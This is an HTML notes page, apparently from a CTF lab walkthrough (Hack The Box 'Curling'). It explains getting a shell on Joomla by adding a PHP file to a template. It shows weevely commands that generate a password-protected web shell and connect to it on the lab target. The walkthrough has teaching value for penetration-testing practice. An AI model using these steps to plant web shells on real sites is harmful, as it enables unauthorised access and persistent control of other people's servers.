@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Get a shell</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Joomla! - Get a shell</h1></strong><br />Getting a shell via the Joomla is the same principle as getting a shell via the WordPress panel - you edit a <code>.php</code> page in the templates.<br /><br /><strong>1. Pick a template</strong><br />Go to <code>Extensions - &gt; Templates - &gt; Templates</code> and pick a template. <br />In this example I picked <code>beeze3</code>.<br />         <br /><strong>2. Create a new file</strong> <br />From the drop down menu pick .php, name it whatever you like, and in the contents of the page paste a <code>.php</code> shell<br />         <br /><strong>2a) Generate a shell </strong><br />Here I&#39;m using <code>weevely</code><br /><div class="codebox"><div class="codebox">root@kali:~/htbCurling#&nbsp;weevely&nbsp;generate&nbsp;magic&nbsp;password<br />Generated&nbsp;&#39;magic&#39;&nbsp;with&nbsp;password&nbsp;&#39;password&#39;&nbsp;of&nbsp;762&nbsp;byte&nbsp;size.</div></div><br /><br /><strong>2b) Copy shell into new page</strong><br />Copy/paste the shell into the content section of the new file template.<br /><div class="codebox"><div class="codebox">root@kali:~/htbCurling#&nbsp;cat&nbsp;magic</div></div><br /><br /><strong>3. Verify the file</strong><br />Check the new file is there by navigating to the shell, you should just see a blank page:<br /><code>http://10.10.10.150/templates/beeze3/magic</code>         <br /><br /><strong>4. Access your shell</strong><br /><div class="codebox"><div class="codebox">root@kali:~/htbCurling#&nbsp;weevely&nbsp;http://10.10.10.150/templates/beeze3/magic&nbsp;password</div></div><br /><br />You should have a shell!<br /></div>
+</body>
+</html>
